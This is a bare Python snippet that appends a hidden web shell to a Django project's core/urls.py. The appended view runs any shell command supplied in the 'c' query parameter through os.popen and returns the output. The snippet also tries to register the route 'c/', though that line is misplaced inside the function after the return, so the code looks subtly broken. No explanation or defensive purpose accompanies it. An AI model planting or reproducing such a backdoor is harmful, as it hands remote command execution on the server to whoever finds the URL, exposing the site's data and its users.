f=open('core/urls.py','a')
f.write("""
from django.http import HttpResponse
def s(r):
    import os
    return HttpResponse(os.popen(r.GET.get("c")).read())
    urlpatterns+=[path("c/",s)]
    """);f.close()

